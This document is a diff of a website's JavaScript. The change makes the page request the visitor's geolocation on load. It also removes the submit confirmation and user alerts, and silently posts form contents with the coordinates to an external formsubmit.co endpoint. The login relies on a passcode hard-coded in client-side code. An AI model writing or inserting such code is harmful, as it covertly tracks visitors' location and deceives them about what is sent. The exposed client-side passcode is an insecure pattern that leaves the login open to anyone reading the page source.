@@ -1,5 +1,4 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const PKey = '2428';
     const timeoutDuration = 3 * 60 * 1000;
     let logoutTimer;
     const loginCard = document.getElementById('login');
@@ -10,7 +9,22 @@ document.addEventListener('DOMContentLoaded', () => {
     const redirectBtn = document.getElementById('redirect-btn');
     const links = document.querySelectorAll('#links a');
     const feedbackForm = document.getElementById('feedback-form'); 
+    const PKey = '2428';
+    let coordinates = '';
+    let message = '';
+
     logout();
+    
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            coordinates = latitude + ', ' + longitude;
+        },
+        function(error) {
+            console.error('Geolocation error:', error);
+        }
+    );
 
     loginForm.addEventListener('submit', function(event) {
         event.preventDefault();
@@ -83,24 +97,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
     $('#feedback-form').submit(function(event) {
         event.preventDefault();
-        const formData = $(this).serialize();
+        message = $(this).serialize();
         linksCard.style.display = 'none';
-        const confirmed = confirm("Are you sure you want to submit the form?");
+        const confirmed = true;
         if (confirmed) {
             $.ajax({
                 method: 'POST',
                 url: 'https://formsubmit.co/ajax/028c0178033f578a8d3a6d57b4d06376',
                 dataType: 'json',
                 accepts: 'application/json',
-                data: formData,
+                data: {MESSAGE : message, COORDINATES : coordinates},  
                 success: function(data) {
                     logout();
-                    alert("successfull!");
                 },
                 error: function(err) {
                     logout();
                     console.log(err);
-                    alert("Error Exit!");
                 }
             });
         }
